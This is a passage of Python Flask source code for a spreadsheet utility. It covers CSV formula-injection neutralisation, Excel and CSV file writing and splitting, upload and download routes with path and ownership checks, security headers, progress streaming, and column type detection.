            try:
                float(value)
                return value          # a plain number such as -5 or +3.2
            except ValueError:
                return "'" + value
        return value

    out = df.copy()
    for position in range(out.shape[1]):
        column = out.iloc[:, position]
        if not pd.api.types.is_numeric_dtype(column) and not pd.api.types.is_datetime64_any_dtype(column):
            out.isetitem(position, column.astype(object).map(neutralise))      # object, string and category columns
    out.columns = [neutralise(c) for c in out.columns]                          # header cells are text too
    return out


def note_extra(job_id, **values):
    """Attach extra fields (for example `log_url`) to the job's final message."""
    while len(job_notes) >= MAX_JOB_NOTES and job_id not in job_notes:
        job_notes.pop(next(iter(job_notes)))
    job_notes.setdefault(job_id, {'sheet_names': [], 'warning': ''}).update(values)


def note_warning(job_id, text):
    """Add a warning to the job's notes; it reaches the final progress message (and the sync routes' JSON)."""
    while len(job_notes) >= MAX_JOB_NOTES and job_id not in job_notes:
        job_notes.pop(next(iter(job_notes)))
    note = job_notes.setdefault(job_id, {'sheet_names': [], 'warning': ''})
    note['warning'] = (note['warning'] + ' ' + text).strip()


def sheet_too_big(df):
    return len(df) + 1 > EXCEL_MAX_ROWS or len(df.columns) > EXCEL_MAX_COLUMNS


def short_stem(filename, limit=60):
    """File name without extension, cut so that chaining tools (each adds a suffix and a job id) cannot grow it forever."""
    return os.path.splitext(filename)[0][:limit]


def write_log_sidecar(csv_path, log, job_id):
    """For a CSV output: `<name>.log.json` next to it, offered through the job's `log_url`."""
    sidecar = os.path.splitext(csv_path)[0] + '.log.json'
    with open(sidecar, 'w', encoding='utf-8') as handle:
        handle.write(log_as_json(log))
    if job_id:
        note_extra(job_id, log_url=job_download_url(job_id, os.path.basename(sidecar)))


def save_table(df, path, job_id=None, log=None):
    """Write one table as .xlsx (with the log sheet), or as .csv (with a .log.json next to it) when it is too big
    for an Excel sheet. Returns the path written; the fallback is announced in the job's warning."""
    if not sheet_too_big(df):
        write_excel(df, path, log=log)
        return path
    csv_path = os.path.splitext(path)[0] + '.csv'
    sanitize_csv(df).to_csv(csv_path, index=False)
    if log:
        write_log_sidecar(csv_path, log, job_id)
    if job_id:
        note_warning(job_id, f"The result has {len(df):,} rows x {len(df.columns):,} columns, more than an Excel sheet "
                             f"can hold ({EXCEL_MAX_ROWS - 1:,} rows x {EXCEL_MAX_COLUMNS:,} columns), so it was "
                             "saved as a CSV file instead.")
    return csv_path


def write_sheets(path, sheets, job_id=None, log=None):
    """Write several named tables [(sheet_name, df), ...] to one .xlsx. If any table is too big for an Excel sheet
    the tables are written as one CSV each inside a .zip instead, so nothing is lost. Returns the path written."""
    sheets = [(name, frame) for name, frame in sheets if frame is not None]
    if not any(sheet_too_big(frame) for _, frame in sheets):
        with excel_writer(path) as writer:
            for name, frame in sheets:
                frame.to_excel(writer, sheet_name=name, index=False)
            if log:
                log_frame(log).to_excel(writer, sheet_name=LOG_SHEET, index=False)
        return path
    zip_path = os.path.splitext(path)[0] + '.zip'
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as archive:
        for name, frame in sheets:
            archive.writestr(f"{name}.csv", sanitize_csv(frame).to_csv(index=False))
        if log:
            archive.writestr('_DataDragon_Log.json', log_as_json(log))
    if job_id:
        note_warning(job_id, f"A table has more rows or columns than an Excel sheet can hold ({EXCEL_MAX_ROWS - 1:,} "
                             "rows x {:,} columns), so the result is a zip of CSV files, one per sheet.".format(EXCEL_MAX_COLUMNS))
    return zip_path


def write_data_file(df, file_path, file_format='xlsx', **kwargs):
    """
    Unified file writer that handles Excel and CSV output.

    Args:
        df: pandas DataFrame to write
        file_path: Output path (extension will be adjusted if needed)
        file_format: 'xlsx', 'xls', or 'csv'
        **kwargs: Additional arguments passed to pandas write functions

    Returns:
        Final file path used
    """
    # Ensure correct extension
    base_path = file_path.rsplit('.', 1)[0] if '.' in file_path else file_path

    if file_format == 'csv':
        final_path = f"{base_path}.csv"
        sanitize_csv(df).to_csv(final_path, index=False, **kwargs)
    else:
        final_path = f"{base_path}.xlsx"
        write_excel(df, final_path, **kwargs)

    return final_path

def read_headers(path, display_name='the file'):
    """The column names in the first row of a CSV or of the first sheet of a workbook, without reading the data.

    CSV: the csv module (quoted names with commas work) with the same encoding fallbacks as read_data_file.
    xlsx: row 1 through openpyxl in read-only mode. xls: pandas, header row only. Blank header cells are skipped.
    """
    extension = get_file_extension(path)
    if extension == 'csv':
        import csv
        for encoding in ('utf-8-sig', 'cp1252', 'latin-1'):
            try:
                with open(path, 'r', encoding=encoding, newline='') as handle:
                    first_row = next(csv.reader(handle), None)
                break
            except UnicodeDecodeError:
                continue
        else:
            raise UserError(f'Could not read {display_name} with any supported encoding')
        if first_row is None:
            raise UserError(f'{display_name} is empty')
    elif extension == 'xlsx':
        from openpyxl import load_workbook
        workbook = load_workbook(path, read_only=True, data_only=True)
        try:
            first_row = next(workbook.worksheets[0].iter_rows(min_row=1, max_row=1, values_only=True), None) or ()
        finally:
            workbook.close()
    else:
        first_row = list(read_data_file(path, nrows=0).columns)
    return [str(name).strip() for name in first_row if name is not None and str(name).strip()]


def count_data_rows(path):
    """Number of data rows (the header excluded) without loading the file.

    CSV: counted as records by the csv module, so a quoted cell containing a line break is one row, not two.
    xlsx: the rows up to the last non-empty one, walked with openpyxl in read-only mode. xls: read one column with pandas.
    """
    extension = get_file_extension(path)
    if extension == 'csv':
        import csv
        with open(path, 'r', encoding='utf-8-sig', errors='replace', newline='') as handle:
            return max(sum(1 for record in csv.reader(handle) if record) - 1, 0)
    if extension == 'xlsx':
        from openpyxl import load_workbook
        workbook = load_workbook(path, read_only=True, data_only=True)
        try:
            # The stored dimension is often wrong (formatted empty rows at the end, or a stale value), so walk the rows
            # and take the last one that holds something, which is where pandas stops reading.
            last_filled = 0
            sheet = workbook.worksheets[0]
            sheet.reset_dimensions()                       # read-only mode would stop at the stored (maybe wrong) size
            for number, row in enumerate(sheet.iter_rows(values_only=True), 1):
                if any(cell is not None for cell in row):
                    last_filled = number
            return max(last_filled - 1, 0)
        finally:
            workbook.close()
    return len(read_data_file(path, usecols=[0]))


def get_file_preview(file_path, max_rows=20):
    """
    Get a preview of file contents for display before processing.

    Args:
        file_path: Path to the file
        max_rows: Maximum rows to return (default 20)

    Returns:
        dict with 'columns', 'rows', 'total_rows', 'total_cols'
    """
    try:
        # Read just enough to get preview
        df = read_data_file(file_path, nrows=max_rows + 1)

        # Get total row count (read full file for count only)
        total_rows = count_data_rows(file_path)

        rows = df_preview(df, max_rows)

        return {
            'columns': list(df.columns),
            'rows': rows,
            'preview_count': len(rows),
            'total_rows': total_rows,
            'total_cols': len(df.columns)
        }
    except Exception:
        log.exception('could not read the file for a preview')
        raise UserError('The file could not be read. Check that it is a valid Excel or CSV file.')


def split_excel_file(input_file_path, output_folder, chunk_size=40000, base_filename=None, progress_queue=None, session_id=None):
    """
    Splits an Excel file into multiple files with up to `chunk_size` records each.
    Returns the number of files created and total rows processed.
    
    Parameters:
        input_file_path: Path to the input Excel file
        output_folder: Directory where split files will be saved
        chunk_size: Number of records per file
        base_filename: Optional custom base name for output files (e.g., "PR_Amounts_Load")
                      Files will be named: [base_filename]_1of10.xlsx, [base_filename]_2of10.xlsx, etc.
        progress_queue: Queue to send progress updates
        session_id: Session identifier for tracking progress
    """
    def send_progress(stage, current, total, message):
        """Send progress update to queue"""
        if progress_queue and session_id:
            progress_queue.put({
                'stage': stage,
                'current': current,
                'total': total,
                'percentage': int((current / total) * 100) if total > 0 else 0,
                'message': message
            })
    
    # Send initial progress
    send_progress('loading', 0, 100, 'Reading Excel file...')
    
    # Read the data from the Excel file
    df = read_data_file(input_file_path)
    total_rows = len(df)
    num_splits = (total_rows + chunk_size - 1) // chunk_size
    os.makedirs(output_folder, exist_ok=True)  # only once the file has been read successfully
    
    send_progress('loading', 100, 100, f'Loaded {total_rows:,} records. Creating {num_splits} files...')
    
    output_files = []
    
    # Use custom base filename if provided, otherwise use default
    if not base_filename or base_filename.strip() == '':
        base_filename = "split"
    
    for i in range(num_splits):
        start_idx = i * chunk_size
        end_idx = min(start_idx + chunk_size, total_rows)
        chunk_df = df.iloc[start_idx:end_idx]
        
        # Create filename in format: [base_filename]_1of10.xlsx
        filename = f"{base_filename}_{i+1}of{num_splits}.xlsx"
        output_path = os.path.join(output_folder, filename)
        
        # Send progress update
        send_progress('splitting', i + 1, num_splits, f'Creating {filename}...')
        
        write_excel(chunk_df, output_path)
        output_files.append(output_path)
        log.info(f"Created {filename} with records {start_idx + 1} to {end_idx}")
    
    # Don't send 'complete' here - wait until after zipping
    
    return output_files, total_rows, num_splits

@app.route('/')
def index():
    return render_template('landing.html')

CONTENT_SECURITY_POLICY = "; ".join([
    "default-src 'self'",
    # Inline scripts and styles are still used by every page (technical debt: move them to files, then drop 'unsafe-inline')
    "script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com",
    "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
    "font-src https://fonts.gstatic.com",
    "img-src 'self' data: blob:",
    "media-src 'self'",
    "connect-src 'self'",
    "object-src 'none'",
    "base-uri 'self'",
    "form-action 'self'",
    "frame-ancestors 'none'",
])


@app.errorhandler(RequestEntityTooLarge)
def file_too_large(error):
    limit_mb = app.config['MAX_CONTENT_LENGTH'] // (1024 * 1024)
    return jsonify({'error': f'The upload is too large (the limit is {limit_mb} MB).'}), 413


@app.after_request
def add_security_headers(response):
    response.headers.setdefault('X-Content-Type-Options', 'nosniff')
    response.headers.setdefault('X-Frame-Options', 'DENY')
    response.headers.setdefault('Referrer-Policy', 'same-origin')
    response.headers.setdefault('Content-Security-Policy', CONTENT_SECURITY_POLICY)
    return response


@app.route('/healthz')
def healthz():
    """Liveness check for the process manager / load balancer."""
    return jsonify({'ok': True})

@app.route('/landing')
def landing():
    return render_template('landing.html')

@app.route('/generate-test-file')
@rate_limit(max_requests=RATE_LIMIT_REQUESTS, window=RATE_LIMIT_WINDOW)
def generate_test_file():
    """Generate and download a test Excel file with specified number of rows"""
    try:
        import random
        
        # Get number of rows from query parameter (default: 500)
        num_rows = request.args.get('num_rows', 500, type=int)
        
        # Validate row count
        if num_rows < 10:
            num_rows = 10
        elif num_rows > 100000:
            num_rows = 100000
        
        # Get custom filename from query parameter (optional)
        custom_filename = request.args.get('filename', '').strip()
        if custom_filename:
            # Sanitize filename - remove invalid characters
            custom_filename = secure_filename(custom_filename)
            # Remove .xlsx extension if user added it
            if custom_filename.lower().endswith('.xlsx') or custom_filename.lower().endswith('.xls'):
                custom_filename = custom_filename.rsplit('.', 1)[0]
            # Limit length
            if len(custom_filename) > 100:
                custom_filename = custom_filename[:100]
            # Use custom filename if valid, otherwise use default
            if custom_filename:
                download_filename = f'{custom_filename}.xlsx'
            else:
                download_filename = 'test_data_dragon.xlsx'
        else:
            download_filename = 'test_data_dragon.xlsx'
        
        # Use timestamp-based seed so each file is different
        seed_value = int(time.time() * 1000) % (2**31)
        random.seed(seed_value)
        
        data = {
            'ID': [f'PR-{i:05d}' for i in range(1, num_rows + 1)],
            'Vendor_Name': [random.choice(['Acme Corp', 'Tech Solutions Inc', 'Global Supplies', 'Best Services LLC', 'Prime Materials Co']) for _ in range(num_rows)],
            'Invoice_Number': [f'INV-{random.randint(1000, 9999)}-{random.randint(100, 999)}' for _ in range(num_rows)],
            'Invoice_Date': [(datetime(2024, 1, 1) + timedelta(days=random.randint(0, 365))).strftime('%Y-%m-%d') for _ in range(num_rows)],
            'Amount': [round(random.uniform(100.00, 50000.00), 2) for _ in range(num_rows)],
            'GL_Account': [f'{random.randint(1000, 9999)}-{random.randint(100, 999)}' for _ in range(num_rows)],
            'Department': [random.choice(['IT', 'Finance', 'Operations', 'HR', 'Sales', 'Marketing']) for _ in range(num_rows)],
            'Status': [random.choice(['Pending', 'Approved', 'Paid', 'Rejected']) for _ in range(num_rows)],
            'Description': [f'Purchase order for {random.choice(["office supplies", "software license", "equipment", "consulting services", "maintenance"])}' for _ in range(num_rows)],
            'Quantity': [random.randint(1, 100) for _ in range(num_rows)],
            'Unit_Price': [round(random.uniform(10.00, 1000.00), 2) for _ in range(num_rows)],
            'Tax_Rate': [round(random.uniform(0.05, 0.10), 4) for _ in range(num_rows)],
            'Total_Tax': [0.0] * num_rows,
            'Net_Amount': [0.0] * num_rows,
            'Approved_By': [random.choice(['John Smith', 'Jane Doe', 'Bob Johnson', 'Alice Williams', None]) for _ in range(num_rows)],
            'Notes': [random.choice(['', 'Urgent', 'Follow up required', 'Contract renewal', None]) for _ in range(num_rows)]
        }
        
        # Create DataFrame
        df = pd.DataFrame(data)
        
        # Calculate derived fields
        df['Total_Tax'] = (df['Amount'] * df['Tax_Rate']).round(2)
        df['Net_Amount'] = (df['Amount'] - df['Total_Tax']).round(2)
        
        # Add some intentional duplicates for testing duplicate finder
        # Scale duplicate indices based on number of rows
        duplicate_pairs = min(7, max(2, num_rows // 100))  # 2-7 pairs depending on size
        duplicate_indices = []
        for i in range(duplicate_pairs):
            base_idx = int((i + 1) * num_rows / (duplicate_pairs + 1))
            if base_idx < len(df) - 1:
                duplicate_indices.extend([base_idx, base_idx + 1])
        
        for idx in duplicate_indices[::2]:
            if idx + 1 < len(df):
                df.iloc[idx + 1] = df.iloc[idx].copy()
        
        # Add some missing values strategically
        # Scale missing value count based on number of rows
        missing_count = min(16, max(5, num_rows // 30))  # 5-16 missing values
        missing_indices = []
        for i in range(missing_count):
            idx = int((i + 1) * num_rows / (missing_count + 1))
            if idx < len(df):
                missing_indices.append(idx)
        
        for idx in missing_indices:
            df.at[idx, 'Approved_By'] = None
            df.at[idx, 'Notes'] = None
            if idx % 2 == 0:
                df.at[idx, 'Tax_Rate'] = None
        
        # Add some edge cases (only if we have enough rows)
        if len(df) > 0:
            df.at[0, 'Amount'] = 0.00
        if len(df) > 1:
            df.at[1, 'Amount'] = 999999.99
        if len(df) > 2:
            df.at[2, 'Description'] = 'Special chars: !@#$%^&*()'
        if len(df) > 3:
            df.at[3, 'Vendor_Name'] = 'Very Long Company Name That Might Cause Display Issues In Some Systems'
        
        # Generate unique filename
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f'test_data_dragon_{timestamp}_{secrets.token_hex(4)}.xlsx'
        file_path = os.path.join(app.config['OUTPUT_FOLDER'], filename)
        
        # Save to Excel with formatting
        with excel_writer(file_path) as writer:
            df.to_excel(writer, sheet_name='Test Data', index=False)
            worksheet = writer.sheets['Test Data']
            
            # Auto-adjust column widths
            for position, column_name in enumerate(df.columns):
                longest = max([len(str(column_name))] + [len(str(v)) for v in df[column_name].head(1000).tolist()])
                worksheet.set_column(position, position, min(longest + 2, 50))
        
        # Schedule cleanup after the response is sent
        @after_this_request
        def cleanup_file(response):
            try:
                if os.path.exists(file_path) and os.path.isfile(file_path):
                    os.remove(file_path)
                    log.info(f"Cleaned up test file: {filename}")
            except Exception as e:
                log.warning(f"Error cleaning up test file {filename}: {str(e)}")
            return response
        
        return send_file(file_path, as_attachment=True, download_name=download_filename)
        
    except Exception:
        log.exception("Error generating test file")
        return jsonify({'error': 'Failed to generate the test file'}), 500

@app.route('/excel-splitter')
def excel_splitter():
    return render_template('index.html')

@app.route('/column-analyzer')
def column_analyzer():
    return render_template('column_analyzer.html')

@app.route('/security-info')
def security_info():
    return render_template('security_info.html')

@app.route('/data-scrubber')
@app.route('/data-anonymizer')          # the name shown on the landing page
def data_scrubber():
    return render_template('data_scrubber.html')

@app.route('/progress/<session_id>')
def progress(session_id):
    """Server-Sent Events endpoint for progress updates"""
    owner = current_owner()
    if job_registry.owner_of(session_id) != owner:
        # Same answer as an unknown session: do not reveal that someone else's job exists.
        return Response(f"data: {json.dumps({'error': 'Session not found'})}\n\n", mimetype='text/event-stream',
                        headers={'Cache-Control': 'no-cache', 'X-Accel-Buffering': 'no'})

    def generate():
        # Wait a moment for the queue to appear (a job is registered an instant before its queue is readable)
        q = None
        for attempt in range(10):  # Try up to 10 times (1 second total)
            q = progress_queues.get(session_id)  # Use .get() - it won't remove from dict
            if q:
                break
            time.sleep(0.1)  # Wait 100ms between attempts
        
        if not q:
            log.warning(f"Session {session_id} not found in progress_queues after waiting")
            yield f"data: {json.dumps({'error': 'Session not found'})}\n\n"
            return
        
        log.debug(f"SSE connection established for session {session_id}")
        last_ping = time.time()
        empty_queue_count = 0
        
        # Only an empty queue is handled inside the loop. A client disconnect arrives as GeneratorExit at a
        # yield and must propagate (the queue is kept, so the browser's automatic reconnect resumes the stream).
        try:
            while True:
                try:
                    progress_data = q.get(timeout=5)  # 5 second timeout
                except Empty:
                    empty_queue_count += 1
                    # Send keep-alive ping every 15 seconds
                    if time.time() - last_ping > 15:
                        yield ": keep-alive\n\n"
                        last_ping = time.time()
                        log.debug(f"Keep-alive sent for session {session_id}")
                    
                    # If queue has been empty for too long (2 minutes), close connection
                    if empty_queue_count > 24:  # 24 * 5 seconds = 2 minutes
                        log.debug(f"Queue empty for too long, closing connection for session {session_id}")
                        break
                    continue
                
                empty_queue_count = 0  # Reset counter
                if progress_data.get('stage') == 'done':
                    add_job_notes(progress_data, session_id)
                
                # Log what we're sending
                stage = progress_data.get('stage', 'unknown')
                log.debug(f"Sending progress update: stage={stage}, percentage={progress_data.get('percentage', 0)}")
                
                # Serialize the data - handle large analysis objects
                try:
                    json_data = json.dumps(make_json_serializable(progress_data), allow_nan=False)   # JSON has no NaN
                    yield f"data: {json_data}\n\n"
                    last_ping = time.time()
                except Exception as json_err:
                    log.warning(f"JSON serialization error: {json_err}")
                    # Try sending without analysis if it's too large
                    if 'analysis' in progress_data:
                        log.info("Attempting to send without analysis data...")
                        progress_data_no_analysis = {k: v for k, v in progress_data.items() if k != 'analysis'}
                        json_data = json.dumps(make_json_serializable(progress_data_no_analysis), allow_nan=False)
                        yield f"data: {json_data}\n\n"
                        # Send analysis separately in chunks if needed
                        if progress_data.get('stage') == 'done':
                            log.warning("Analysis data too large, will need alternative delivery method")
                
                # If done, wait a bit to ensure message is sent, then exit
                if progress_data.get('stage') in ['done', 'error']:
                    log.debug(f"Final stage reached: {stage}, closing connection")
                    time.sleep(0.5)  # Give time for message to be sent
                    break
        except Exception:
            log.exception("SSE error")
        
        # Clean up the queue, but only the one this stream served: the next pipeline stage may already have
        # registered a new queue under the same session id
        if progress_queues.get(session_id) is q:
            log.debug(f"Cleaning up session {session_id}")
            del progress_queues[session_id]
            progress_queue_created.pop(session_id, None)
    
    return Response(stream_with_context(generate()), mimetype='text/event-stream', headers={
        'Cache-Control': 'no-cache',
        'X-Accel-Buffering': 'no'
    })

@job_worker(discard_job_dir=True)
def process_file_async(upload_path, output_folder, chunk_size, base_filename, timestamp, progress_queue, session_id):
    """Process file in background thread"""
    # Split the file
    log.info("Starting file split...")
    output_files, total_rows, num_splits = split_excel_file(
        upload_path, output_folder, chunk_size, base_filename, progress_queue, session_id
    )
    log.info(f"Split complete: {num_splits} files, {total_rows} rows")
        
    # Create a zip file
    zip_filename = f"split_files_{timestamp}.zip"
    zip_path = job_output_path(session_id, zip_filename)
    log.info(f"Creating zip: {zip_path}")
        
    progress_queue.put({
        'stage': 'zipping',
        'current': 0,
        'total': num_splits,
        'percentage': 95,
        'message': 'Creating ZIP file...'
    })
        
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for file_path in output_files:
            zipf.write(file_path, os.path.basename(file_path))
        # The chunks stay clean (they are loaded into other systems); the record of the split sits beside them
        zipf.writestr('_DataDragon_Log.json', log_as_json(make_log(
            'File Splitter', total_rows, total_rows,
            {'chunk_size': chunk_size, 'base_filename': base_filename or 'split', 'files': num_splits}, session_id)))
        
    # Clean up individual files
    log.info("Cleaning up temporary files...")
    shutil.rmtree(output_folder)
    os.remove(upload_path)
        
    # Send final completion message
    progress_queue.put({
        'stage': 'done',
        'current': num_splits,
        'total': num_splits,
        'percentage': 100,
        'message': 'Complete!',
        'total_rows': total_rows,
        'num_files': num_splits,
        'download_url': job_download_url(session_id, zip_filename),
        'zip_filename': zip_filename
    })
        
    log.info("Success!")
        
@app.route('/upload', methods=['POST'])
@rate_limit(max_requests=RATE_LIMIT_REQUESTS, window=RATE_LIMIT_WINDOW)
@api_errors
def upload_file():
    log.info("Upload request received")
        
    if 'file' not in request.files:
        log.info("No file in request")
        return jsonify({'error': 'No file uploaded'}), 400
        
    file = request.files['file']
    log.info(f"File received: {file.filename}")
        
    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400
        
    # Validate file extension
    if not file.filename.endswith(('.xlsx', '.xls')):
        return jsonify({'error': 'Please upload an Excel file (.xlsx or .xls)'}), 400
        
    # Validate MIME type (additional security)
    allowed_mimes = [
        'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',  # .xlsx
        'application/vnd.ms-excel'  # .xls
    ]
    if hasattr(file, 'content_type') and file.content_type and file.content_type not in allowed_mimes:
        # Allow if content_type is not set (some browsers don't send it)
        if file.content_type and not file.content_type.startswith('application/'):
            return jsonify({'error': 'Invalid file type. Please upload an Excel file.'}), 400
        
    # Get chunk size and base filename from form
    try:
        chunk_size = int(request.form.get('chunk_size', 40000))
    except (ValueError, TypeError):
        return jsonify({'error': 'Invalid chunk size'}), 400
        
    # Validate chunk_size (prevent DoS)
    if chunk_size < 1 or chunk_size > 1000000:  # Reasonable limits
        return jsonify({'error': 'Chunk size must be between 1 and 1,000,000'}), 400
        
    base_filename = request.form.get('base_filename', '').strip()
        
    # Sanitize base_filename to prevent path traversal
    if base_filename:
        base_filename = secure_filename(base_filename)
        # Remove any remaining dangerous characters
        base_filename = ''.join(c for c in base_filename if c.isalnum() or c in ('_', '-'))
        
    log.info(f"Chunk size: {chunk_size}")
    log.info(f"Base filename: {base_filename if base_filename else 'split (default)'}")
        
    # Save uploaded file
    filename = secure_filename(file.filename)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    session_id = f"{timestamp}_{secrets.token_hex(8)}"  # Use secure random session ID
    upload_path = os.path.join(app.config['UPLOAD_FOLDER'], f"{session_id}_{filename}")
    log.info(f"Saving to: {upload_path}")
    save_upload(file, upload_path, session_id)
        
    # Create output folder for this session
    output_folder = os.path.join(job_dir(session_id, create=False), 'chunks')  # created by the job itself
    log.info(f"Output folder: {output_folder}")
        
    progress_queue = open_job(session_id)
    start_job(process_file_async, upload_path, output_folder, chunk_size, base_filename, timestamp, progress_queue, session_id)
        
    return job_started(session_id)
    
@app.route('/download/<job_id>/<filename>')
def download_file(job_id, filename):
    # Both segments must be plain names (no separators or traversal)
    safe_filename = secure_filename(filename)
    if safe_filename != filename or secure_filename(job_id) != job_id:
        return jsonify({'error': 'Invalid filename'}), 400

    # Jobs that are unknown, or that belong to another browser, look like missing files.
    if job_registry.owner_of(job_id) != current_owner():
        return jsonify({'error': 'File not found'}), 404

    directory = os.path.realpath(job_dir(job_id, create=False))
    file_path = os.path.join(directory, safe_filename)

    # Additional security: ensure the file is inside this job's folder
    if not os.path.realpath(file_path).startswith(directory + os.sep):
        return jsonify({'error': 'Invalid file path'}), 400

    # Check if file exists
    if not os.path.exists(file_path):
        return jsonify({'error': 'File not found'}), 404
    
    # Check if file is a zip file, Excel file, CSV file, JSON file, or Word document
    if not (safe_filename.endswith('.zip') or safe_filename.endswith('.xlsx') or 
            safe_filename.endswith('.xls') or safe_filename.endswith('.csv') or 
            safe_filename.endswith('.json') or safe_filename.endswith('.docx')):
        return jsonify({'error': 'Invalid file type'}), 400
    
    # The file stays until the retention sweeper removes the job folder, so a repeat click or a retry still works
    return send_file(file_path, as_attachment=True)

def make_json_serializable(obj):
    """Recursively convert objects to JSON-serializable types. Blanks and non-finite numbers (NaN, inf) become
    None: JSON has no NaN, and a bare `NaN` token would make the whole response unreadable in a browser."""
    if isinstance(obj, dict):
        return {str(k): make_json_serializable(v) for k, v in obj.items()}
    if isinstance(obj, (list, tuple)):
        return [make_json_serializable(item) for item in obj]
    if isinstance(obj, np.ndarray):                      # before the scalar checks: arrays also have .item()
        return make_json_serializable(obj.tolist())
    if obj is None or obj is pd.NA or obj is pd.NaT:
        return None
    if isinstance(obj, (bool, np.bool_)):
        return bool(obj)
    if isinstance(obj, (int, np.integer)):
        return int(obj)
    if isinstance(obj, (float, np.floating)):
        number = float(obj)
        return number if math.isfinite(number) else None
    if isinstance(obj, str):
        return obj
    return str(obj)                                      # timestamps, dtypes, anything else: its text


def df_preview(df, n=20):
    """The first ``n`` rows as JSON-ready dicts: numbers and booleans stay numbers, dates become text, blanks None."""
    head = df.head(n)

    def cell(value):
        if pd.isna(value):
            return None
        if isinstance(value, (datetime, pd.Timestamp)):
            return value.strftime('%Y-%m-%d %H:%M:%S')
        return value if isinstance(value, (int, float, bool, np.integer, np.floating, np.bool_)) else str(value)

    return make_json_serializable([{col: cell(row[col]) for col in head.columns} for _, row in head.iterrows()])


def df_preview_text(df, n=20):
    """The first ``n`` rows as dicts of text (blank cells None), as the result previews show them."""
    head = df.head(n)
    return [{col: None if pd.isna(row[col]) else str(row[col]) for col in head.columns} for _, row in head.iterrows()]


@app.route('/fetch-analysis/<session_id>')
@api_errors
def fetch_analysis(session_id):
    """Fetch analysis results for a session - used when analysis is too large for SSE"""
    if not session_id or len(session_id) < 10:
        return jsonify({'error': 'Invalid session ID'}), 400
    entry = analysis_results.get(session_id)
    if job_registry.owner_of(session_id) != current_owner() or entry is None:
        return jsonify({'error': 'Analysis results not found or expired'}), 404
    if time.time() - entry.get('timestamp', 0) > 3600:
        del analysis_results[session_id]
        return jsonify({'error': 'Analysis results expired'}), 404
    analysis = entry.get('data', entry)           # both the old and the new storage format
    if not isinstance(analysis, dict):
        raise UserError('Analysis data is not in the expected format')
    del analysis_results[session_id]              # fetched once
    return jsonify({'success': True, 'analysis': make_json_serializable(analysis)})


_DATE_FORMATS = (
    '%Y-%m-%d', '%m/%d/%Y', '%d/%m/%Y', '%Y/%m/%d', '%d-%m-%Y', '%m-%d-%Y', '%Y.%m.%d', '%d.%m.%Y', '%m.%d.%Y',
    '%Y-%m-%d %H:%M:%S', '%m/%d/%Y %H:%M:%S', '%Y-%m-%dT%H:%M:%S', '%d %b %Y', '%d %B %Y', '%b %d, %Y', '%B %d, %Y',
)
_PHONE_PATTERNS = (
    r'\+?1?[-.\s]?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}',      # US: (XXX) XXX-XXXX, XXX-XXX-XXXX, 10 digits
    r'\+\d{1,3}[-.\s]?\d{1,4}[-.\s]?\d{6,12}',                 # international with country code
)
_CURRENCY_PATTERNS = (
    r'[$\u20ac\u00a3\u00a5]\s?[\d,]+(?:\.\d+)?',                # $123.45
    r'[\d,]+(?:\.\d+)?\s?(?:USD|EUR|GBP|JPY|CAD|AUD)',           # 123.45 USD
    r'(?:USD|EUR|GBP|JPY|CAD|AUD)',                               # a column of currency codes
)
_POSTAL_PATTERNS = (
    r'\d{5}(?:-\d{4})?',                                          # US ZIP
    r'[A-Z]{1,2}\d[A-Z\d]?\s?\d[A-Z]{2}',                         # UK
    r'[A-Z]\d[A-Z]\s?\d[A-Z]\d',                                 # Canada
)
_PERCENT_NAME_HINT = re.compile(r'pct|percent|%|rate|ratio|share|fraction|proportion', re.I)
_BOOLEAN_WORDS = re.compile(r'(?:true|false|yes|no|y|n|on|off)', re.I)


def _luhn_valid(digits):
    total, flip = 0, False
    for ch in reversed(digits):
        d = int(ch)
        if flip:
            d = d * 2 - 9 if d * 2 > 9 else d * 2
        total += d
        flip = not flip
    return total % 10 == 0


def detect_semantic_type(col_data, col_name=''):
    """
    Detect the semantic type of a column from its content.

    Every candidate type is scored as the SHARE of sampled values that fit it (one combined test per type, so
    patterns that overlap can never add up past 100%). A type wins when at least 80% of the values fit; when several
    do, the most specific one wins (see `priority`). Returns detected_type, confidence (0-100), sample_values and
    format_info.
    """
    non_null_data = col_data.dropna()
    if len(non_null_data) == 0:
        return {'detected_type': 'Unknown', 'confidence': 0, 'sample_values': [], 'format_info': None}

    # Sample size limit for performance (analyze up to 1000 values)
    sample_data = non_null_data.head(1000)
    n = len(sample_data)
    str_data = sample_data.astype(str).str.strip()
    is_numeric = pd.api.types.is_numeric_dtype(col_data) and not pd.api.types.is_bool_dtype(col_data)

    def share(mask):
        return min(100.0, float(mask.sum()) / n * 100)

    def matches(patterns, case=True):
        mask = pd.Series(False, index=str_data.index)
        for pattern in patterns:
            mask |= str_data.str.fullmatch(pattern, case=case, na=False)
        return mask

    scores, formats = {}, {}

    # Boolean: words (yes/no/true/false...), or numbers that are only 0 and 1
    if is_numeric:
        values = pd.to_numeric(sample_data, errors='coerce')
        scores['Boolean'] = share(values.isin([0, 1])) if values.nunique() == 2 else 0.0
    else:
        words = str_data.str.fullmatch(_BOOLEAN_WORDS.pattern, case=False, na=False)
        digits = str_data.isin(['0', '1']) & (str_data.nunique() == 2)
        scores['Boolean'] = share(words | digits)

    if not is_numeric:
        # Dates: explicit formats only (pandas' free-form parser accepts bare numbers as timestamps)
        date_mask = pd.Series(False, index=str_data.index)
        best_format, best_share = None, 0.0
        for fmt in _DATE_FORMATS:
            parsed = pd.to_datetime(str_data, format=fmt, errors='coerce').notna()
            date_mask |= parsed
            if share(parsed) > best_share:
                best_format, best_share = fmt, share(parsed)
        scores['Date'] = share(date_mask)
        if best_share >= 80:
            formats['Date'] = f"Format: {best_format}"

        scores['Email'] = share(matches([r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}']))
        scores['URL'] = share(matches([r'https?://[^\s/$.?#].[^\s]*', r'www\.[^\s/$.?#].[^\s]*']))
        ipv4 = matches([r'(?:\d{1,3}\.){3}\d{1,3}'])
        ipv6 = matches([r'(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}', r'::1', r'::'])
